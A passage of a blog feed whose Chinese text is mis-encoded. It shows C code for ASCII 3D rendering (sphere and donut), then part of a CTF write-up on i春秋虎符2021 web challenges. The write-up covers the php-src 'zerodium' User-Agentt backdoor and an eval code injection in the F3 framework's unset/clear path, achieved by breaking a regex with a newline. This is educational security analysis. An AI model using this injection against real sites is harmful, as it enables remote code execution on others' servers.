class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_xy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">   HANDLE hOut;</span><br><span class="line">hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">   COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">   SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br><span class="line">main()&#123;</span><br><span class="line"><span class="keyword">int</span> size=<span class="number">45</span>;</span><br><span class="line"><span class="keyword">double</span> g=<span class="number">0.01</span>;</span><br><span class="line"><span class="keyword">double</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> r=(<span class="keyword">double</span>(size)<span class="number">-4</span>)/<span class="number">2.0</span>;</span><br><span class="line"><span class="keyword">double</span> light[<span class="number">3</span>]=&#123;<span class="number">-1.3</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">double</span> length=<span class="built_in">sqrt</span>(light[<span class="number">0</span>]*light[<span class="number">0</span>]+light[<span class="number">1</span>]*light[<span class="number">1</span>]+light[<span class="number">2</span>]*light[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">light[i]=light[i]/length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.;!o*m0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> out_i[size][size]=&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> ro[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="built_in">cos</span>(rotate),-<span class="built_in">sin</span>(rotate)&#125;,&#123;<span class="number">0</span>,<span class="built_in">sin</span>(rotate),<span class="built_in">cos</span>(rotate)&#125;&#125;;</span><br><span class="line"><span class="keyword">double</span> light_r[<span class="number">3</span>]=&#123;light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">0</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">0</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">1</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">1</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">1</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">2</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">2</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">2</span>]&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> a=<span class="number">0.0</span>;a&lt;<span class="number">3.15</span>;a+=g)&#123;<span class="comment">//alpha </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> b=<span class="number">0.0</span>;b&lt;<span class="number">3.15</span>;b+=g)&#123;<span class="comment">//beta </span></span><br><span class="line"><span class="keyword">double</span> x=r*<span class="built_in">sin</span>(b)*<span class="built_in">cos</span>(a);</span><br><span class="line"><span class="keyword">double</span> y=r*<span class="built_in">sin</span>(b)*<span class="built_in">sin</span>(a);</span><br><span class="line"><span class="keyword">double</span> z=r*<span class="built_in">cos</span>(b);</span><br><span class="line"><span class="keyword">double</span> result=(x/r*light_r[<span class="number">0</span>]+y/r*light_r[<span class="number">1</span>]+z/r*light_r[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">final</span>=<span class="keyword">int</span>(result*<span class="number">10.0</span><span class="number">-1</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if(final&gt;10||final&lt;0)&#123;</span></span><br><span class="line"><span class="comment">if(final&gt;10)final=10;</span></span><br><span class="line"><span class="comment">else if(final&lt;0)final=0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> cx=<span class="keyword">int</span>(x+move);</span><br><span class="line"><span class="keyword">int</span> cy=<span class="keyword">int</span>(z+move);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">final</span>&gt;out_i[cx][cy])<span class="comment">//è¿™ç§å–æœ€å¤§äº®åº¦çš„å†™æ³•æ˜æ˜¾æ˜¯ä¸å¥½çš„ï¼Œä½†è¿™ä¸ªä¾‹å­ç‰¹æ®Šï¼Œç”¨èµ·æ¥æ²¡é—®é¢˜</span></span><br><span class="line">out_i[cx][cy]=<span class="keyword">final</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(out_i[i][j]!=<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">goto_xy(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™„ä¸Šç”œç”œåœˆçš„ä»£ç ï¼Œå†™æ–¹å—ä¹‹å‰æ²¡ä»”ç»†çœ‹è¿‡ï¼Œæ‰€ä»¥æˆ‘å†™çš„æ–¹å—éå¸¸å†—ä½™ï¼ˆä¸»è¦æ˜¯æƒ³å…ˆç‹¬ç«‹å°è¯•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">float</span> A = <span class="number">0</span>, B = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">float</span> z[<span class="number">1760</span>];</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">1760</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">32</span>,<span class="number">1760</span>);</span><br><span class="line">        <span class="built_in">memset</span>(z,<span class="number">0</span>,<span class="number">7040</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; <span class="number">6.28</span>; j += <span class="number">0.07</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">6.28</span>; i += <span class="number">0.02</span>) &#123;</span><br><span class="line">                <span class="keyword">float</span> c = <span class="built_in">sin</span>(i);</span><br><span class="line">                <span class="keyword">float</span> d = <span class="built_in">cos</span>(j);</span><br><span class="line">                <span class="keyword">float</span> e = <span class="built_in">sin</span>(A);</span><br><span class="line">                <span class="keyword">float</span> f = <span class="built_in">sin</span>(j);</span><br><span class="line">                <span class="keyword">float</span> g = <span class="built_in">cos</span>(A);</span><br><span class="line">                <span class="keyword">float</span> h = d + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">float</span> D = <span class="number">1</span> / (c * h * e + f * g + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">float</span> l = <span class="built_in">cos</span>(i);</span><br><span class="line">                <span class="keyword">float</span> m = <span class="built_in">cos</span>(B);</span><br><span class="line">                <span class="keyword">float</span> n = <span class="built_in">sin</span>(B);</span><br><span class="line">                <span class="keyword">float</span> t = c * h * g - f * e;</span><br><span class="line">                <span class="keyword">int</span> x = <span class="number">40</span> + <span class="number">30</span> * D * (l * h * m - t * n);</span><br><span class="line">                <span class="keyword">int</span> y= <span class="number">12</span> + <span class="number">15</span> * D * (l * h * n + t * m);</span><br><span class="line">                <span class="keyword">int</span> o = x + <span class="number">80</span> * y;</span><br><span class="line">                <span class="keyword">int</span> N = <span class="number">8</span> * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">22</span> &gt; y &amp;&amp; y &gt; <span class="number">0</span> &amp;&amp; x &gt; <span class="number">0</span> &amp;&amp; <span class="number">80</span> &gt; x &amp;&amp; D &gt; z[o]) &#123;</span><br><span class="line">                    z[o] = D;</span><br><span class="line">                    b[o] = <span class="string">&quot;.,-~:;=!*#$@&quot;</span>[N &gt; <span class="number">0</span> ? N : <span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">1761</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(k % <span class="number">80</span> ? b[k] : <span class="number">10</span>);</span><br><span class="line">            A += <span class="number">0.00004</span>;</span><br><span class="line">            B += <span class="number">0.00002</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;é€›bç«™çœ‹åˆ°ä¼šè½¬çš„ç”œç”œåœˆï¼Œå¯¹å›¾å½¢å­¦æœ‰ç‚¹ä¸Šå¤´ï¼Œè‡ªå·±æ‹¿èœ¥è¯­è¨€åšä¸ªç«‹æ–¹ä½“ç©ç©&lt;/p&gt;
&lt;img src=&quot;/images/å›¾å½¢å­¦HelloWorld.gif&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt;</summary>
    
    
    
    <category term="æ‘¸é±¼" scheme="https://kyriota.github.io/categories/%E6%91%B8%E9%B1%BC/"/>
    
    
    <category term="å›¾å½¢å­¦" scheme="https://kyriota.github.io/tags/%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>iæ˜¥ç§‹è™ç¬¦2021 web</title>
    <link href="https://kyriota.github.io/2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/"/>
    <id>https://kyriota.github.io/2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/</id>
    <published>2021-04-09T16:35:02.000Z</published>
    <updated>2021-05-03T06:53:42.223Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•é¢˜ç›®æ‰«ç›²ï¼Œåªæœ‰å‰ä¸‰é¢˜ï¼ŒåŒ…å«ä»¥ä¸‹pointsï¼š</p><p>â€‹    â‘ 3.28 php.netåé—¨</p><p>â€‹    â‘¡3F(FatFreeFramework)æ¡†æ¶</p><p>â€‹    â‘¢SQLä¸­md5()äº§ç”Ÿhexçš„â€™orâ€™è¿›è¡Œçš„æ³¨å…¥</p><p>â€‹    â‘£SSRFä¸gopheråè®®</p><span id="more"></span><!--toc--><h1 id="iæ˜¥ç§‹è™ç¬¦2021-web"><a href="#iæ˜¥ç§‹è™ç¬¦2021-web" class="headerlink" title="iæ˜¥ç§‹è™ç¬¦2021_web"></a>iæ˜¥ç§‹è™ç¬¦2021_web</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>2021.3.28å‡ºäº†phpå®˜æ–¹gitä»“åº“git.php.netè¢«æ’å…¥æ¶æ„ä»£ç çš„äº‹ï¼Œè‹¥ä½¿ç”¨æ­¤æºç è¿›è¡Œå¼€å‘ï¼Œç½‘ç«™å°±ä¼šæ‰§è¡Œuser_agenttå¤´ä¸­ä»¥zerodiumå¼€å§‹çš„ä»»æ„ä»£ç ï¼Œæ³¨æ„double tï¼Œæ²¡æœ‰æ‰“é”™</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0github.png"></p><center><a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">view on github</a></center><p>é¢˜ç›®ç¯å¢ƒæ˜¯ä¸€ä¸ªblogï¼Œæœ€åä¸€ç¯‡æ–‡ç« æè¿°äº†åšå®¢æ­å»ºè¿‡ç¨‹ï¼Œåœ¨æ²¡æœ‰hintçš„æƒ…å†µä¸‹è¿™æ˜¯å…¥æ‰‹ç‚¹</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0blog.png"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span> = <span class="keyword">require</span>(<span class="string">&#x27;1ib/base.php&#x27;</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;set( <span class="string">&#x27;DEBUG&#x27;</span> ,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCREVERSION &lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCREversion is out date&#x27;</span>);</span><br><span class="line"><span class="comment">//Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span> [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p align='right'><small>å…³é”®å­—ï¼šframeworkï¼Œf3</small></p><p>æ­¤ä¸ºåŸºäºf3æ¡†æ¶ç¼–å†™çš„ä»£ç ï¼Œæ‹¿åˆ°æ‰‹æ—¶åº”å…ˆæœ¬åœ°æ­å»ºæ­¤æ¡†æ¶ï¼Œå¯¹äºæœ¬é¢˜ï¼Œè¿™æ ·ä½ æ‰æœ‰äº†base.phpï¼Œæ‰å¯ä»¥è§£é¢˜ï¼Œå„ç§ä¸ç†Ÿæ‚‰å¯¼è‡´æ‰¾ä¸åˆ°æœ¬é¢˜å…¥æ‰‹ç‚¹</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3Framework.png"></p><p>æŠŠé¢˜ç›®ä»£ç copyè¿‡æ¥ï¼ŒåŠ ä¸ŠrouteæŒ‡å®šè·¯å¾„åæœ¬åœ°è¿è¡Œï¼ˆä¹Ÿå°±æ˜¯è¯´è¦å…ˆè®¾ç½®<code>route</code>å†<code>run</code>ï¼Œä¸ç„¶æ¡†æ¶è·‘éƒ½è·‘ä¸èµ·æ¥ï¼Œæ€ä¹ˆè®¾ç½®æŸ¥ä¸€ä¸‹æ–‡æ¡£å°±çŸ¥é“äº†Â¯\_(ãƒ„)_/Â¯ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /test.php&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;route set successfully&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3run.png"></p><p>ç›´æ¥æŠ¥é”™äº†ï¼Œçœ‹çœ‹530è¡Œevalçš„æƒ…å†µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$val</span>=preg_replace(<span class="string">&#x27;/^(\$hive)/&#x27;</span>,<span class="string">&#x27;$this-&gt;hive&#x27;</span>,</span><br><span class="line">                          <span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive.&#x27;</span>.<span class="variable">$key</span>, <span class="literal">FALSE</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;unset(&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;);&#x27;</span>);    <span class="comment">#ç¬¬530è¡Œ</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$parts</span>[<span class="number">0</span>]==<span class="string">&#x27;SESSION&#x27;</span>) &#123;</span><br><span class="line">            session_commit();</span><br><span class="line">            session_start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿½ä¸€ä¸‹ä»£ç éªŒè¯ä¸€ä¸‹æ˜¯ä¸æ˜¯<code>unset</code>è§¦å‘çš„<code>clear()</code>ï¼Œå‘ç°è°ƒç”¨é“¾æ¡æ˜¯<code>__unset($key)</code>â†’<code>offsetunset($key)</code>â†’<code>clear($key)</code>å®é”¤</p><p>è§é‡Œé¢æœ‰ä¸€ä¸ª<code>compile()</code>ï¼Œåº·åº·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$evaluate</span>=<span class="literal">TRUE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (!<span class="variable">$evaluate</span>)</span><br><span class="line">        ? preg_replace_callback(</span><br><span class="line">            <span class="string">&#x27;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#x27;</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expr</span>[<span class="number">2</span>]))</span><br><span class="line">                    <span class="variable">$str</span>.=preg_replace_callback(</span><br><span class="line">                        <span class="string">&#x27;/\.([^.\[\]]+)|\[((?:[^\[\]\&#x27;&quot;]*|(?R))*)\]/&#x27;</span>,</span><br><span class="line">                        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$sub</span></span>) </span>&#123;</span><br><span class="line">                            <span class="variable">$val</span>=<span class="keyword">isset</span>(<span class="variable">$sub</span>[<span class="number">2</span>]) ? <span class="variable">$sub</span>[<span class="number">2</span>] : <span class="variable">$sub</span>[<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (ctype_digit(<span class="variable">$val</span>))</span><br><span class="line">                                <span class="variable">$val</span>=(<span class="keyword">int</span>)<span class="variable">$val</span>;</span><br><span class="line">                            <span class="variable">$out</span>=<span class="string">&#x27;[&#x27;</span>.<span class="keyword">$this</span>-&gt;export(<span class="variable">$val</span>).<span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="variable">$expr</span>[<span class="number">2</span>]</span><br><span class="line">                    );</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="variable">$str</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment">#------------------ä¸‹é¢è¿™æ®µéƒ½æ— å…³ï¼Œæ¯•ç«Ÿclear()é‡Œä¼ äº†FALSE------------------</span></span><br><span class="line">        : preg_replace_callback(</span><br><span class="line">        <span class="string">&#x27;/(?&lt;!\w)@(\w+(?:(?:\-&gt;|::)\w+)?)&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27;((?:\.\w+|\[(?:(?:[^\[\]]*|(?R))*)\]|(?:\-&gt;|::)\w+|\()*)/&#x27;</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">#...</span></span><br></pre></td></tr></table></figure><p>çœ‹æ ·å­å¯¹è¾“å…¥åšäº†æ”¹åŠ¨ï¼Œä½†å…¶å®ä¸æƒ³åˆ†æ<code>complie()</code>çš„è¯ï¼Œç›´æ¥<code>echo</code>å³å¯çŸ¥é“åˆ°åº•evaläº†ä»€ä¹ˆä»£ç </p><blockquote>å½“a=hello<br>[Out] unset('$this->hive['hello']');</blockquote><p>ä½†ç°åœ¨æ—¢ç„¶æ¯”èµ›å·²ç»ç»“æŸé‚£è¿˜æ˜¯ç¨å¾®æ·±å…¥çœ‹ä¸€ä¸‹<code>complie()</code>ï¼Œé‡åˆ°äº†æˆ‘æ²¡è§è¿‡çš„phpï¼šå›è°ƒï¼ŒåŒ¿åå‡½æ•°</p><ul><li><p>å›è°ƒï¼šåœ¨å‡½æ•°æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸€èˆ¬æ˜¯ä¸èƒ½å»å¹²é¢„ä»–çš„è¡Œä¸ºçš„ï¼Œå½“å‡½æ•°è¢«è®¾è®¡æˆå¸¦æœ‰å›è°ƒåŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å°±æœ‰å¯èƒ½åœ¨å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡å›è°ƒå‡½æ•°å»å¹²é¢„ä»–</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"><span class="variable">$n</span>, <span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$n</span> &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span> ? <span class="variable">$f</span>(<span class="variable">$i</span>) : <span class="variable">$i</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ— å›è°ƒæ—¶</span></span><br><span class="line">foo(<span class="number">5</span>); <span class="comment">//01234</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//æœ‰å›è°ƒæ—¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$v</span> + <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">5</span>, <span class="string">&#x27;f1&#x27;</span>); <span class="comment">//02468</span></span><br></pre></td></tr></table></figure></li><li><p>åŒ¿åå‡½æ•°ï¼šå…è®¸ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æŒ‡å®šåç§°çš„å‡½æ•°ã€‚æœ€ç»å¸¸ç”¨ä½œå›è°ƒå‡½æ•°<code>callable</code>å›è°ƒå‚æ•°çš„å€¼</p></li></ul><p>è€Œ<code>preg_replace_callback</code>é™¤äº†å¯ä»¥æŒ‡å®šä¸€ä¸ª <code>callback</code> æ›¿ä»£ <code>replacement</code> è¿›è¡Œæ›¿æ¢å­—ç¬¦ä¸²çš„è®¡ç®—ï¼Œå…¶ä»–æ–¹é¢ç­‰åŒäº<code>preg_replace</code></p><p>è‡³äºä»€ä¹ˆ<code>$this-&gt;hive</code>ä¹‹ç±»çš„æ‚ä¸ƒæ‚å…«çš„éƒ½æ˜¯åé¢æ‰åŠ ä¸Šå»çš„ï¼Œå’Œ<code>compile()</code>æ— å…³</p><p>å› ä¸ºä¼ å‚<code>a</code>ä¼šè¢«<code>compile</code>å¤„ç†ä¸º<code>[&#39;xxx&#39;]</code>çš„å½¢å¼ï¼Œæ‰€ä»¥éœ€è¦æ‰“ç ´è¿™ç§æ ¼å¼ï¼Œç„¶åç‚¹å·è¿æ¥å¹¶é—­åˆ<code>unset</code>ï¼Œæœ€å<code>eval</code>æ‰§è¡Œä»»æ„ä»£ç </p><p>çœ‹çœ‹è¿™ä¸ªæ­£åˆ™<code>&#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&quot;]*|(?R))*)\]/&#39;</code>ï¼Œå¹¶æ²¡æœ‰åŒ¹é…æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥å‡ºäº†æ¢è¡Œç¬¦è¿™ä¸ªæ­£åˆ™å°±ä¼šè¢«æ‰“æ–­ï¼Œäºæ˜¯ä¾¿è¶…åº¦æˆåŠŸ</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-%E6%8D%A2%E8%A1%8C%E7%AC%A6.png"></p><h2 id="æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ"><a href="#æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ" class="headerlink" 